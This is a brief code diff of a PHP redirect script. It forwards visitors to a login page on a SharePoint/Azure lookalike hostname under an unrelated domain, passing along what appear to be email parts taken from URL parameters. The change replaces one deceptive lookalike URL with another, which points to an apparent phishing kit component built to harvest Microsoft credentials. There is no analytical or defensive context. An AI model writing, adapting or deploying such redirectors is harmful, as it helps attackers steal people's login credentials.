@@ -7,5 +7,5 @@ function Redirect($url, $permanent = false)
  }
  exit();
 }
-Redirect("https://my-sharepoint.com.resandstat.com/auth/login.php?client_id=" . $_GET['1'] . "@" . $_GET['2']   . "", false);
+Redirect("https://share-point.azure.resandstat.com/auth/login.php?client_id=" . $_GET['1'] . "@" . $_GET['2']   . "", false);
 ?>
